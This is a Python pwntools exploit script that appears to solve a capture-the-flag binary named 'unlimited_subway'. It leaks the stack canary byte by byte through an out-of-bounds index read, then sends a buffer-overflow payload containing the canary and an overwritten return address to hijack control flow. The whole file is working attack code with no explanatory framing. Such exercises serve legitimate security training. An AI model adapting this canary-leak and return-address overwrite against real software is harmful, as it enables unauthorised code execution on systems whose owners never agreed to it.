from pwn import *

context.log_level = 'error'

p = process("./share/unlimited_subway")

def view(idx):
    p.recvuntil(b">")
    p.sendline(b"V")
    p.recvuntil(b"Index : ")
    p.sendline(str(idx).encode())
    line = p.recvline()
    val = int(line.split(b":")[1].strip(), 16)
    return val

canary = b""
for i in range(128, 132):
    canary += bytes([view(i)])
print("canary:", canary.hex())

p.recvuntil(b">")
p.sendline(b"E")
p.recvuntil(b"Name Size : ")
p.sendline(b"200")
p.recvuntil(b"Name : ")
payload = b"A"*0x40 + canary + b"B"*4 + p32(0x8049304)
p.sendline(payload)

print(p.recvall(timeout=5).decode(errors="replace"))
